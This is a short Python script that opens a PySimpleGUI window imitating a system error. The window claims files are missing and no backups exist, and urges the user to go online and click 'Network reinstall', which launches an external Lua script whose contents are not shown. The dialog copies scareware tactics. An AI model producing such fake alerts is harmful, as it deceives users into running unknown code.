import PySimpleGUI as sg
import os

layout = [[sg.Text('ERROR file not found')],
[sg.Text('A system file(s) are missing. there are no avilble backups to restore from. in order to repair your PC, we need internet. please connect to the internet and click Network reinstall')],
[sg.Button('Network reinstall'), sg.Exit()],
]

window = sg.Window('ERROR', layout)

while True:
    event, values = window.read()
    
    if event in (sg.WIN_CLOSED, 'Exit'):
        break
    elif event == 'Network reinstall':
     os.system("lua lualib/recoverysys/search.lua")